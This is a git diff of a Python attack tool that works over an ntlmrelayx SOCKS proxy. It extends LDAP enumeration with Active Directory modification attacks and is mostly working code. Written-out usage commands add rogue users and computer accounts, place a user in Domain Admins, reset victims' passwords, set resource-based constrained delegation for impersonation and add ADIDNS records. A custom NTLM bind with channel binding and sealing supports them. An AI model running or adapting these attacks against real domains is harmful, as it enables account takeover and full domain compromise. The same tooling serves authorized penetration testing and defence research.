@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-LDAP Enumeration via ntlmrelayx SOCKS5 Proxy
+LDAP Enumeration and Modification via ntlmrelayx SOCKS5 Proxy
 
 PURPOSE:
-This script enables LDAP enumeration through ntlmrelayx's SOCKS proxy when standard
-tools fail. It replicates Certipy's LDAP connection method to work around ntlmrelayx
-SOCKS5 LDAP implementation issues.
+This script enables LDAP enumeration and modification through ntlmrelayx's SOCKS proxy
+when standard tools fail. It replicates Certipy's LDAP connection method to work around
+ntlmrelayx SOCKS5 LDAP implementation issues.
 
 PROBLEM IT SOLVES:
 When using ntlmrelayx with SOCKS5 proxying for LDAP sessions, most tools fail:
@@ -40,12 +40,13 @@ OUTPUT FORMATS:
 
 USAGE EXAMPLES:
 
-1. Default - BloodHound Legacy v4 format (most compatible):
+ENUMERATION:
+1. Default - BloodHound Legacy v5 format (most compatible):
    proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot
    # Creates: loot_bhlegacy_YYYYMMDD_HHMMSS/ with 7 JSON files
    # Import to BloodHound 4.2 or 4.3
 
-2. BloodHound CE v5 format:
+2. BloodHound CE v6 format:
    proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot --bloodhound-ce
    # Creates: loot_bhce_YYYYMMDD_HHMMSS/ with 7 JSON files
    # Import to BloodHound CE (v5.0+)
@@ -56,6 +57,25 @@ USAGE EXAMPLES:
 
 4. Specific enumeration (Kerberoastable users only):
    proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --kerberoastable -o kerb
+
+MODIFICATION (Active Directory Attacks):
+5. Add new user:
+   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-user eviluser --add-user-pass 'P@ss123!'
+
+6. Add computer account (for RBCD attacks):
+   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-computer EVIL01 --add-computer-pass 'P@ss123!'
+
+7. Add user to Domain Admins:
+   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-user-to-group eviluser "Domain Admins"
+
+8. Reset user password:
+   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --set-password victim 'NewP@ss!'
+
+9. Set RBCD delegation (for impersonation attacks):
+   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --set-rbcd DC01 EVIL01$
+
+10. Add DNS A record (for ADIDNS attacks):
+    proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-dns attacker 10.10.10.50
 
 USAGE WITH NTLMRELAYX:
 1. Start ntlmrelayx with SOCKS:
@@ -75,7 +95,7 @@ ALTERNATIVE USE:
 Can also be used for any LDAP enumeration when you have credentials, even without
 SOCKS proxy - just run without proxychains.
 
-WHAT'S COLLECTED:
+ENUMERATION CAPABILITIES:
 - Users (with UAC flags, SPNs, delegation, ACLs)
 - Computers (with OS info, delegation, ACLs)
 - Groups (with membership, ACLs)
@@ -85,6 +105,14 @@ WHAT'S COLLECTED:
 - Kerberoastable accounts (users with SPNs)
 - AS-REP roastable accounts (no preauth required)
 
+MODIFICATION CAPABILITIES (like bloodyAD):
+- Add User: Create new user accounts with password
+- Add Computer: Create computer accounts with password and SPNs
+- Add User to Group: Add users to groups (e.g., Domain Admins)
+- Set Password: Reset/change user passwords
+- Set RBCD: Configure Resource-Based Constrained Delegation for impersonation
+- Add DNS: Add DNS A records to AD-Integrated DNS zones
+
 LIMITATIONS:
 - ACLs collected as base64 (not parsed into BloodHound relationships)
 - No group membership resolution (Members array empty)
@@ -92,20 +120,767 @@ LIMITATIONS:
 - Works via ntlmrelayx SOCKS where bloodhound-python fails
 
 CREDITS:
-Based on analysis of Certipy's LDAP implementation by ly4k
-https://github.com/ly4k/Certipy
+- LDAP connection method based on Certipy's implementation by ly4k
+  https://github.com/ly4k/Certipy
+- LDAP modification operations based on bloodyAD by CravateRouge
+  https://github.com/CravateRouge/bloodyAD
 """
 
 
-from ldap3 import Server, Connection, NTLM, SUBTREE, ALL_ATTRIBUTES
+from ldap3 import Server, Connection, NTLM, SUBTREE, ALL_ATTRIBUTES, MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE
+from ldap3.core.results import RESULT_SUCCESS
+from ldap3.protocol import rfc4511
+from ldap3.strategy.base import BaseStrategy
+from ldap3.utils.asn1 import encode as ldap3_encode
+import ldap3.strategy.sync
 import sys
 import argparse
 import json
 import base64
+import ssl
+import hashlib
+import struct
+import random
+import string
+import calendar
+import time
+import socket
+import ipaddress
 from datetime import datetime, timezone
 from pathlib import Path
+from typing import Any, List, Optional, Tuple, cast
 
-# BloodHound Legacy v4 trust mappings (integers, not strings)
+# Impacket imports for NTLM
+from impacket.ntlm import (
+    AV_PAIRS,
+    KXKEY,
+    MAC,
+    NTLMSSP_AV_DNS_HOSTNAME,
+    NTLMSSP_AV_TARGET_NAME,
+    NTLMSSP_AV_TIME,
+    NTLMSSP_NEGOTIATE_56,
+    NTLMSSP_NEGOTIATE_128,
+    NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
+    NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY,
+    NTLMSSP_NEGOTIATE_KEY_EXCH,
+    NTLMSSP_NEGOTIATE_NTLM,
+    NTLMSSP_NEGOTIATE_SEAL,
+    NTLMSSP_NEGOTIATE_SIGN,
+    NTLMSSP_NEGOTIATE_TARGET_INFO,
+    NTLMSSP_NEGOTIATE_UNICODE,
+    NTLMSSP_NEGOTIATE_VERSION,
+    NTLMSSP_REQUEST_TARGET,
+    SEAL,
+    SEALKEY,
+    SIGNKEY,
+    NTLMAuthChallenge,
+    NTLMAuthChallengeResponse,
+    NTLMAuthNegotiate,
+    NTLMMessageSignature,
+    NTOWFv2,
+    generateEncryptedSessionKey,
+    hmac_md5,
+)
+
+# Crypto imports
+try:
+    from Cryptodome.Cipher import ARC4
+except ImportError:
+    from Crypto.Cipher import ARC4
+
+def get_channel_binding_data(server_cert: bytes) -> bytes:
+    """
+    Generate channel binding token (CBT) from a server certificate.
+
+    This implements the tls-server-end-point channel binding type as described
+    in RFC 5929 section 4. The binding token is created by:
+    1. Hashing the server certificate with SHA-256
+    2. Creating a channel binding structure with the hash
+    3. Computing an MD5 hash of the structure
+
+    Args:
+        server_cert: Raw server certificate bytes
+
+    Returns:
+        MD5 hash of the channel binding structure (16 bytes)
+
+    References:
+        - RFC 5929: https://datatracker.ietf.org/doc/html/rfc5929#section-4
+    """
+    # Hash the certificate with SHA-256 as required by the RFC
+    cert_hash = hashlib.sha256(server_cert).digest()
+
+    # Initialize the channel binding structure with empty addresses
+    # These fields are defined in the RFC but not used for TLS bindings
+    initiator_address = b"\x00" * 8
+    acceptor_address = b"\x00" * 8
+
+    # Create the application data with the "tls-server-end-point:" prefix
+    application_data_raw = b"tls-server-end-point:" + cert_hash
+
+    # Add the length prefix to the application data (little-endian 32-bit integer)
+    len_application_data = len(application_data_raw).to_bytes(
+        4, byteorder="little", signed=False
+    )
+    application_data = len_application_data + application_data_raw
+
+    # Assemble the complete channel binding structure
+    channel_binding_struct = initiator_address + acceptor_address + application_data
+
+    # Return the MD5 hash of the structure
+    return hashlib.md5(channel_binding_struct).digest()
+
+
+def get_channel_binding_data_from_ssl_socket(ssl_socket: ssl.SSLSocket) -> bytes:
+    """
+    Extract channel binding data from an SSL socket.
+
+    This function extracts the server certificate from an SSL socket
+    and generates the channel binding token used for authentication.
+
+    Args:
+        ssl_socket: The SSL socket object containing TLS connection information
+
+    Returns:
+        The channel binding token as bytes
+
+    Raises:
+        ValueError: If unable to extract required TLS information from the socket
+    """
+    # Get the peer/server certificate in binary (DER) format
+    peer_cert = ssl_socket.getpeercert(True)
+
+    if peer_cert is None:
+        raise ValueError(
+            "No peer certificate found in SSL socket - server may not have presented a certificate"
+        )
+
+    # Generate and return channel binding data using the server certificate
+    return get_channel_binding_data(peer_cert)
+
+
+# NTLM Constants
+NTLMSSP_AV_CHANNEL_BINDINGS = 0x0A
+
+
+def compute_response(
+    server_challenge: bytes,
+    client_challenge: bytes,
+    target_info: bytes,
+    domain: str,
+    user: str,
+    password: str,
+    nt_hash: str = "",
+    channel_binding_data: Optional[bytes] = None,
+    service: str = "LDAP",
+) -> Tuple[bytes, bytes, bytes, bytes]:
+    """
+    Compute NTLMv2 response based on the provided parameters.
+
+    Args:
+        server_challenge: Challenge received from the server
+        client_challenge: Client-generated random challenge
+        target_info: Target information provided by the server
+        domain: Domain name for authentication
+        user: Username for authentication
+        password: Password for authentication
+        nt_hash: NT hash if available, otherwise password will be used
+        channel_binding_data: Channel binding data for EPA compliance
+        service: Service name for the SPN (default: LDAP)
+
+    Returns:
+        Tuple containing NT response, LM response, session base key, target hostname
+    """
+    # Generate response key
+    response_key_nt = NTOWFv2(user, password, domain, bytes.fromhex(nt_hash) if nt_hash else "")  # type: ignore
+    av_pairs = AV_PAIRS(target_info)
+
+    # Add SPN (target name)
+    if av_pairs[NTLMSSP_AV_DNS_HOSTNAME] is None:
+        raise ValueError("NTLMSSP_AV_DNS_HOSTNAME not found in target info")
+
+    hostname = cast(Tuple[int, bytes], av_pairs[NTLMSSP_AV_DNS_HOSTNAME])[1]
+    spn = f"{service}/".encode("utf-16le") + hostname
+    av_pairs[NTLMSSP_AV_TARGET_NAME] = spn
+
+    # Add timestamp if not already present
+    if av_pairs[NTLMSSP_AV_TIME] is None:
+        timestamp = struct.pack(
+            "<q", (116444736000000000 + calendar.timegm(time.gmtime()) * 10000000)
+        )
+        av_pairs[NTLMSSP_AV_TIME] = timestamp
+
+    # Add channel bindings if provided
+    if channel_binding_data:
+        av_pairs[NTLMSSP_AV_CHANNEL_BINDINGS] = channel_binding_data
+
+    # Construct temp data for NT proof calculation
+    temp = (
+        b"\x01"  # RespType
+        + b"\x01"  # HiRespType
+        + b"\x00" * 2  # Reserved1
+        + b"\x00" * 4  # Reserved2
+        + cast(Tuple[int, bytes], av_pairs[NTLMSSP_AV_TIME])[1]  # Timestamp
+        + client_challenge  # ChallengeFromClient
+        + b"\x00" * 4  # Reserved
+        + av_pairs.getData()  # AvPairs
+    )
+
+    # Calculate response components
+    nt_proof_str = hmac_md5(response_key_nt, server_challenge + temp)
+    nt_challenge_response = nt_proof_str + temp
+    lm_challenge_response = (
+        hmac_md5(response_key_nt, server_challenge + client_challenge)
+        + client_challenge
+    )
+    session_base_key = hmac_md5(response_key_nt, nt_proof_str)
+
+    # Handle anonymous authentication
+    if not user and not password:
+        nt_challenge_response = b""
+        lm_challenge_response = b""
+
+    return nt_challenge_response, lm_challenge_response, session_base_key, hostname
+
+
+def ntlm_negotiate(
+    signing_required: bool = False,
+    use_ntlmv2: bool = True,
+) -> NTLMAuthNegotiate:
+    """
+    Generate an NTLMSSP Type 1 negotiation message.
+
+    Args:
+        signing_required: Whether signing is required for the connection
+        use_ntlmv2: Whether to use NTLMv2 (should be True for modern systems)
+
+    Returns:
+        NTLMAuthNegotiate object representing the Type 1 message
+    """
+    # Create base negotiate message with standard flags
+    auth = NTLMAuthNegotiate()
+    auth["flags"] = (
+        NTLMSSP_NEGOTIATE_NTLM
+        | NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
+        | NTLMSSP_NEGOTIATE_UNICODE
+        | NTLMSSP_REQUEST_TARGET
+        | NTLMSSP_NEGOTIATE_128
+        | NTLMSSP_NEGOTIATE_56
+    )
+
+    # Add security flags if signing is required
+    if signing_required:
+        auth["flags"] |= (
+            NTLMSSP_NEGOTIATE_KEY_EXCH
+            | NTLMSSP_NEGOTIATE_SIGN
+            | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            | NTLMSSP_NEGOTIATE_SEAL
+        )
+
+    # Add NTLMv2 target info flag
+    if use_ntlmv2:
+        auth["flags"] |= NTLMSSP_NEGOTIATE_TARGET_INFO
+
+    return auth
+
+
+def ntlm_authenticate(
+    type1: NTLMAuthNegotiate,
+    challenge: NTLMAuthChallenge,
+    user: str,
+    password: str,
+    domain: str,
+    nt_hash: str = "",
+    channel_binding_data: Optional[bytes] = None,
+    service: str = "LDAP",
+) -> Tuple[NTLMAuthChallengeResponse, bytes, int]:
+    """
+    Generate an NTLMSSP Type 3 authentication message in response to a server challenge.
+
+    Args:
+        type1: The Type 1 negotiate message that was sent
+        challenge: The Type 2 challenge message received from the server
+        user: Username for authentication
+        password: Password for authentication
+        domain: Domain name for authentication
+        nt_hash: NT hash if available, otherwise password will be used
+        channel_binding_data: Channel binding data for EPA compliance
+        service: Service name for the SPN (default: LDAP)
+
+    Returns:
+        Tuple containing Type 3 message, exported session key, negotiated flags
+    """
+    # Get response flags from the initial negotiate message
+    response_flags = type1["flags"]
+
+    # Generate client challenge (8 random bytes)
+    client_challenge = struct.pack("<Q", random.getrandbits(64))
+
+    # Extract target info from the challenge
+    target_info = challenge["TargetInfoFields"]
+
+    # Compute the NTLM response components
+    nt_response, lm_response, session_base_key, hostname = compute_response(
+        challenge["challenge"],
+        client_challenge,
+        target_info,
+        domain,
+        user,
+        password,
+        nt_hash,
+        channel_binding_data,
+        service,
+    )
+
+    # Adjust response flags based on server capabilities
+    security_flags = [
+        NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY,
+        NTLMSSP_NEGOTIATE_128,
+        NTLMSSP_NEGOTIATE_KEY_EXCH,
+        NTLMSSP_NEGOTIATE_SEAL,
+        NTLMSSP_NEGOTIATE_SIGN,
+        NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
+    ]
+
+    for flag in security_flags:
+        if not (challenge["flags"] & flag):
+            response_flags &= ~flag
+
+    # Calculate the key exchange key
+    key_exchange_key = KXKEY(
+        challenge["flags"],
+        session_base_key,
+        lm_response,
+        challenge["challenge"],
+        password,
+        "",
+        nt_hash,
+        True,
+    )
+
+    # Handle key exchange if required
+    if challenge["flags"] & NTLMSSP_NEGOTIATE_KEY_EXCH:
+        # Generate random session key
+        exported_session_key = "".join(
+            random.choices(string.ascii_letters + string.digits, k=16)
+        ).encode()
+        encrypted_random_session_key = generateEncryptedSessionKey(
+            key_exchange_key, exported_session_key
+        )
+    else:
+        encrypted_random_session_key = None
+        exported_session_key = key_exchange_key
+
+    # Create and populate the challenge response
+    challenge_response = NTLMAuthChallengeResponse(
+        user, password, challenge["challenge"]
+    )
+    challenge_response["flags"] = response_flags
+    challenge_response["domain_name"] = domain.encode("utf-16le")
+    challenge_response["host_name"] = hostname
+    challenge_response["lanman"] = lm_response if lm_response else b"\x00"
+    challenge_response["ntlm"] = nt_response
+
+    # Add session key if key exchange is enabled
+    if encrypted_random_session_key:
+        challenge_response["session_key"] = encrypted_random_session_key
+
+    return challenge_response, exported_session_key, response_flags
+
+
+class NTLMCipher:
+    """
+    NTLM cipher for encrypting and decrypting LDAP messages when LDAP signing/sealing is enabled.
+    """
+    def __init__(self, flags: int, session_key: bytes):
+        self.flags = flags
+
+        # Same key for everything initially
+        self.client_sign_key = session_key
+        self.server_sign_key = session_key
+        self.client_seal_key = session_key
+        cipher = ARC4.new(self.client_sign_key)
+        self.client_seal = cipher.encrypt
+        self.server_seal = cipher.encrypt
+
+        if self.flags & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
+            self.client_sign_key = cast(bytes, SIGNKEY(self.flags, session_key))
+            self.server_sign_key = cast(
+                bytes, SIGNKEY(self.flags, session_key, "Server")
+            )
+            self.client_seal_key = SEALKEY(self.flags, session_key)
+            self.server_seal_key = SEALKEY(self.flags, session_key, "Server")
+
+            client_cipher = ARC4.new(self.client_seal_key)
+            self.client_seal = client_cipher.encrypt
+            server_cipher = ARC4.new(self.server_seal_key)
+            self.server_seal = server_cipher.encrypt
+
+        self.sequence = 0
+
+    def encrypt(self, plain_data: bytes) -> Tuple[NTLMMessageSignature, bytes]:
+        """Encrypt data for sending to server."""
+        message, signature = SEAL(
+            self.flags,
+            self.client_sign_key,
+            self.client_seal_key,
+            plain_data,
+            plain_data,
+            self.sequence,
+            self.client_seal,
+        )
+        self.sequence += 1
+        return signature, message
+
+    def decrypt(self, answer: bytes) -> Tuple[NTLMMessageSignature, bytes]:
+        """Decrypt data received from server."""
+        answer, signature = SEAL(
+            self.flags,
+            self.server_sign_key,
+            self.server_seal_key,
+            answer[:16],
+            answer[16:],
+            self.sequence,
+            self.server_seal,
+        )
+        return signature, answer
+
+
+class ExtendedStrategy(ldap3.strategy.sync.SyncStrategy):
+    """
+    Extended strategy class for LDAP connections with encryption support.
+
+    This class extends the default SyncStrategy to provide custom
+    sending and receiving methods for LDAP messages with NTLM encryption.
+    """
+
+    def __init__(self, connection: "ExtendedLdapConnection") -> None:
+        """Initialize the extended strategy with a connection."""
+        super().__init__(connection)
+        self._connection = connection
+        # Override the default receiving method to use the custom implementation
+        self.receiving = self._receiving
+        self.sequence_number = 0
+
+    def sending(self, ldap_message: Any) -> None:
+        """Send an LDAP message, optionally encrypting it first."""
+        try:
+            encoded_message = cast(bytes, ldap3_encode(ldap_message))
+
+            # Encrypt the message if required and not in SASL progress
+            if self._connection.should_encrypt and not self.connection.sasl_in_progress:
+                encoded_message = self._connection._encrypt(encoded_message)
+                self.sequence_number += 1
+
+            self.connection.socket.sendall(encoded_message)
+        except socket.error as e:
+            self.connection.last_error = f"socket sending error: {e}"
+            print(f"[!] Failed to send LDAP message: {e}", file=sys.stderr)
+            raise
+
+        # Update usage statistics if enabled
+        if self.connection.usage:
+            self.connection._usage.update_transmitted_message(
+                self.connection.request, len(encoded_message)
+            )
+
+    def _receiving(self) -> List[bytes]:  # type: ignore
+        """Receive data over the socket and handle message encryption/decryption."""
+        messages = []
+        receiving = True
+        unprocessed = b""
+        data = b""
+        get_more_data = True
+        sasl_total_bytes_received = 0
+        sasl_received_data = b""
+        sasl_next_packet = b""
+        sasl_buffer_length = -1
+
+        while receiving:
+            if get_more_data:
+                try:
+                    data = self.connection.socket.recv(self.socket_size)
+                except (OSError, socket.error, AttributeError) as e:
+                    self.connection.last_error = f"error receiving data: {e}"
+                    try:
+                        self.close()
+                    except (socket.error, Exception):
+                        pass
+                    print(f"[!] Failed to receive LDAP message: {e}", file=sys.stderr)
+                    raise
+
+                # Handle encrypted messages (from NTLM)
+                if (
+                    self._connection.should_encrypt
+                    and not self.connection.sasl_in_progress
+                ):
+                    data = sasl_next_packet + data
+
+                    if sasl_received_data == b"" or sasl_next_packet:
+                        # Get the size of the encrypted message
+                        sasl_buffer_length = int.from_bytes(data[0:4], "big")
+                        data = data[4:]
+                    sasl_next_packet = b""
+                    sasl_total_bytes_received += len(data)
+                    sasl_received_data += data
+
+                    # Check if we have received the complete encrypted message
+                    if sasl_total_bytes_received >= sasl_buffer_length:
+                        # Handle multi-packet SASL messages
+                        sasl_next_packet = sasl_received_data[sasl_buffer_length:]
+
+                        # Decrypt the received message
+                        sasl_received_data = self._connection._decrypt(
+                            sasl_received_data[:sasl_buffer_length]
+                        )
+                        sasl_total_bytes_received = 0
+                        unprocessed += sasl_received_data
+                        sasl_received_data = b""
+                else:
+                    unprocessed += data
+
+            if len(data) > 0:
+                # Try to compute the message length
+                length = BaseStrategy.compute_ldap_message_size(unprocessed)
+
+                if length == -1:  # too few data to decode message length
+                    get_more_data = True
+                    continue
+
+                if len(unprocessed) < length:
+                    get_more_data = True
+                else:
+                    messages.append(unprocessed[:length])
+                    unprocessed = unprocessed[length:]
+                    get_more_data = False
+                    if len(unprocessed) == 0:
+                        receiving = False
+            else:
+                receiving = False
+
+        return messages
+
+
+class ExtendedLdapConnection(ldap3.Connection):
+    """
+    Extended LDAP connection class with support for NTLM encryption and channel binding.
+
+    This class extends ldap3.Connection to provide custom NTLM bind with channel binding support.
+    """
+
+    def __init__(
+        self,
+        *args: Any,
+        use_channel_binding: bool = False,
+        use_signing: bool = False,
+        use_ssl: bool = False,
+        target_domain: str = "",
+        target_user: str = "",
+        target_password: str = "",
+        target_nthash: str = "",
+        **kwargs: Any
+    ) -> None:
+        """Initialize an extended LDAP connection."""
+        super().__init__(*args, **kwargs)
+
+        # Replace standard strategy with extended strategy
+        self.strategy = ExtendedStrategy(self)
+
+        # Store connection properties
+        self.use_channel_binding = use_channel_binding
+        self.use_signing = use_signing
+        self.use_ssl = use_ssl
+        self.target_domain = target_domain
+        self.target_user = target_user
+        self.target_password = target_password
+        self.target_nthash = target_nthash
+        self.negotiated_flags = 0
+
+        # Encryption-related attributes
+        self.ntlm_cipher: Optional[NTLMCipher] = None
+        self.should_encrypt = False
+
+        # Alias important methods from strategy for direct access
+        self.send = self.strategy.send
+        self.open = self.strategy.open
+        self.get_response = self.strategy.get_response
+        self.post_send_single_response = self.strategy.post_send_single_response
+        self.post_send_search = self.strategy.post_send_search
+
+    def _encrypt(self, data: bytes) -> bytes:
+        """Encrypt LDAP message data using NTLM cipher."""
+        if self.ntlm_cipher is not None:
+            # NTLM encryption
+            signature, data = self.ntlm_cipher.encrypt(data)
+            data = signature.getData() + data
+            data = len(data).to_bytes(4, byteorder="big", signed=False) + data
+        return data
+
+    def _decrypt(self, data: bytes) -> bytes:
+        """Decrypt LDAP message data using NTLM cipher."""
+        if self.ntlm_cipher is not None:
+            # NTLM decryption
+            _, data = self.ntlm_cipher.decrypt(data)
+        return data
+
+    def do_ntlm_bind(self, controls: Any = None) -> dict:
+        """
+        Perform NTLM bind operation with optional channel binding and signing.
+
+        This method implements the complete NTLM authentication flow:
+        1. Sicily package discovery to verify NTLM support
+        2. NTLM negotiate message exchange
+        3. Challenge/response handling with optional channel binding
+        4. Session key establishment and encryption setup
+
+        Returns:
+            Result of the bind operation
+        """
+        self.last_error = None  # type: ignore
+
+        with self.connection_lock:
+            if not self.sasl_in_progress:
+                self.sasl_in_progress = True
+                try:
+                    # Step 1: Sicily package discovery to check for NTLM support
+                    request = rfc4511.BindRequest()
+                    request["version"] = rfc4511.Version(self.version)
+                    request["name"] = ""
+                    request[
+                        "authentication"
+                    ] = rfc4511.AuthenticationChoice().setComponentByName(
+                        "sicilyPackageDiscovery", rfc4511.SicilyPackageDiscovery("")
+                    )
+
+                    response = self.post_send_single_response(
+                        self.send("bindRequest", request, controls)
+                    )
+
+                    result = response[0]
+
+                    if "server_creds" not in result:
+                        raise Exception(
+                            "Server did not return available authentication packages"
+                        )
+
+                    # Check if NTLM is supported
+                    sicily_packages = result["server_creds"].decode().split(";")
+                    if "NTLM" not in sicily_packages:
+                        print(
+                            f"[!] NTLM authentication not available. Supported: {sicily_packages}",
+                            file=sys.stderr
+                        )
+                        raise Exception("NTLM not available on server")
+
+                    # Step 2: Send NTLM negotiate message
+                    use_signing = self.use_signing and not self.use_ssl
+                    print(f"[*] NTLM signing: {use_signing} (Signing: {self.use_signing}, SSL: {self.use_ssl})", file=sys.stderr)
+
+                    negotiate = ntlm_negotiate(use_signing)
+
+                    request = rfc4511.BindRequest()
+                    request["version"] = rfc4511.Version(self.version)
+                    request["name"] = "NTLM"
+                    request[
+                        "authentication"
+                    ] = rfc4511.AuthenticationChoice().setComponentByName(
+                        "sicilyNegotiate", rfc4511.SicilyNegotiate(negotiate.getData())
+                    )
+
+                    response = self.post_send_single_response(
+                        self.send("bindRequest", request, controls)
+                    )
+
+                    result = response[0]
+
+                    if result["result"] != RESULT_SUCCESS:
+                        print(f"[!] NTLM negotiate failed: {result}", file=sys.stderr)
+                        return result
+
+                    if "server_creds" not in result:
+                        raise Exception(
+                            "Server did not return NTLM challenge"
+                        )
+
+                    # Step 3: Process challenge and prepare authenticate response
+                    challenge = NTLMAuthChallenge()
+                    challenge.fromString(result["server_creds"])
+
+                    channel_binding_data = None
+                    use_channel_binding = self.use_channel_binding and self.use_ssl
+
+                    print(f"[*] Channel binding: {use_channel_binding} (Enabled: {self.use_channel_binding}, SSL: {self.use_ssl})", file=sys.stderr)
+
+                    if use_channel_binding:
+                        if not isinstance(self.socket, ssl.SSLSocket):
+                            raise Exception(
+                                "LDAP server is using SSL but connection is not an SSL socket"
+                            )
+
+                        print("[*] Extracting channel binding data from SSL socket", file=sys.stderr)
+
+                        # Extract channel binding data from SSL socket
+                        channel_binding_data = get_channel_binding_data_from_ssl_socket(
+                            self.socket
+                        )
+
+                    # Generate NTLM authenticate message
+                    challenge_response, session_key, negotiated_flags = (
+                        ntlm_authenticate(
+                            negotiate,
+                            challenge,
+                            self.target_user,
+                            self.target_password or "",
+                            self.target_domain,
+                            self.target_nthash,
+                            channel_binding_data=channel_binding_data,
+                        )
+                    )
+
+                    # Step 4: Set up encryption if negotiated
+                    self.negotiated_flags = negotiated_flags
+                    self.should_encrypt = (
+                        negotiated_flags & NTLMSSP_NEGOTIATE_SEAL
+                        == NTLMSSP_NEGOTIATE_SEAL
+                    )
+
+                    if self.should_encrypt:
+                        print("[*] NTLM encryption enabled", file=sys.stderr)
+                        self.ntlm_cipher = NTLMCipher(
+                            negotiated_flags,
+                            session_key,
+                        )
+
+                    # Step 5: Complete authentication with the NTLM authenticate message
+                    request = rfc4511.BindRequest()
+                    request["version"] = rfc4511.Version(self.version)
+                    request["name"] = ""
+                    request[
+                        "authentication"
+                    ] = rfc4511.AuthenticationChoice().setComponentByName(
+                        "sicilyResponse",
+                        rfc4511.SicilyResponse(challenge_response.getData()),
+                    )
+
+                    response = self.post_send_single_response(
+                        self.send("bindRequest", request, controls)
+                    )
+
+                    result = response[0]
+
+                    if result["result"] != RESULT_SUCCESS:
+                        print(f"[!] LDAP NTLM authentication failed: {result}", file=sys.stderr)
+                    else:
+                        print("[+] LDAP NTLM authentication successful", file=sys.stderr)
+
+                    return result
+                finally:
+                    self.sasl_in_progress = False
+            else:
+                raise Exception("SASL authentication already in progress")
+
+
+# BloodHound Legacy trust mappings (integers, not strings)
 TRUST_DIRECTION_MAP = {
     "Disabled": 0,
     "Inbound": 1, 
@@ -1699,23 +2474,515 @@ def convert_to_bloodhound_ce(data, domain, output_dir):
         import traceback
         traceback.print_exc()
 
-def enumerate_ldap(host, port, domain, username, password, base_dn=None, output_dir=None, 
-                   enum_users=False, enum_computers=False, enum_groups=False, 
+
+# ============================================================================
+# LDAP Modification Operations
+# ============================================================================
+
+def encode_password(password):
+    """
+    Encode password for unicodePwd attribute.
+    Password must be enclosed in quotes and encoded as UTF-16LE
+    """
+    return ('"%s"' % password).encode('utf-16le')
+
+
+def resolve_dn(conn, target, base_dn):
+    """
+    Resolve a target (sAMAccountName, DN, or SID) to a Distinguished Name
+    """
+    # If it looks like a DN already, return it
+    if ',' in target and ('CN=' in target.upper() or 'DC=' in target.upper()):
+        return target
+
+    # Try to find by sAMAccountName
+    search_filter = f"(sAMAccountName={target})"
+    try:
+        results = conn.extend.standard.paged_search(
+            search_base=base_dn,
+            search_filter=search_filter,
+            search_scope=SUBTREE,
+            attributes=['distinguishedName'],
+            paged_size=100,
+            generator=True
+        )
+        for entry in results:
+            if entry['type'] == 'searchResEntry':
+                return entry['attributes'].get('distinguishedName')
+    except:
+        pass
+
+    # If not found, assume it's a CN in the base DN
+    return target
+
+
+def get_object_sid(conn, target, base_dn):
+    """
+    Get the objectSid of a target object
+    """
+    # Resolve to DN first
+    target_dn = resolve_dn(conn, target, base_dn)
+
+    search_filter = "(objectClass=*)"
+    try:
+        results = conn.extend.standard.paged_search(
+            search_base=target_dn,
+            search_filter=search_filter,
+            search_scope='BASE',
+            attributes=['objectSid'],
+            paged_size=1,
+            generator=True
+        )
+        for entry in results:
+            if entry['type'] == 'searchResEntry':
+                # objectSid is returned as raw bytes, need to convert
+                sid_bytes = entry['attributes'].get('objectSid')
+                if sid_bytes:
+                    return sid_to_string(sid_bytes)
+    except Exception as e:
+        print(f"[-] Error getting SID: {e}")
+
+    return None
+
+
+def sid_to_string(sid_bytes):
+    """
+    Convert binary SID to string format (S-1-5-21-...)
+    """
+    if isinstance(sid_bytes, list):
+        sid_bytes = sid_bytes[0]
+
+    # SID structure: Revision (1 byte) + SubAuthorityCount (1 byte) + Authority (6 bytes) + SubAuthorities (4 bytes each)
+    revision = sid_bytes[0]
+    sub_auth_count = sid_bytes[1]
+    authority = int.from_bytes(sid_bytes[2:8], byteorder='big')
+
+    sid_str = f"S-{revision}-{authority}"
+
+    for i in range(sub_auth_count):
+        offset = 8 + (i * 4)
+        sub_auth = int.from_bytes(sid_bytes[offset:offset+4], byteorder='little')
+        sid_str += f"-{sub_auth}"
+
+    return sid_str
+
+
+def create_security_descriptor_for_rbcd(service_sid_str):
+    """
+    Create a security descriptor for RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
+    This is a simplified version that creates a security descriptor with one ACE
+
+    Format: SDDL (Security Descriptor Definition Language)
+    O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{service_sid})
+
+    But we need binary format for LDAP. We'll build it manually.
+    """
+    # Convert SID string to binary
+    parts = service_sid_str.split('-')
+    revision = int(parts[1])
+    authority = int(parts[2])
+    sub_authorities = [int(x) for x in parts[3:]]
+
+    # Build binary SID
+    sid_binary = struct.pack('B', revision)  # Revision
+    sid_binary += struct.pack('B', len(sub_authorities))  # SubAuthorityCount
+    sid_binary += struct.pack('>Q', authority)[2:]  # Authority (6 bytes, big-endian)
+    for sub_auth in sub_authorities:
+        sid_binary += struct.pack('<I', sub_auth)  # SubAuthorities (little-endian)
+
+    # Build ACE (Access Control Entry)
+    # ACE Type: ACCESS_ALLOWED_ACE_TYPE (0x00)
+    # ACE Flags: 0x00
+    # Access Mask: GENERIC_ALL (0x10000000) or ADS_RIGHT_DS_CONTROL_ACCESS (0x00000100)
+    ace_type = 0x00
+    ace_flags = 0x00
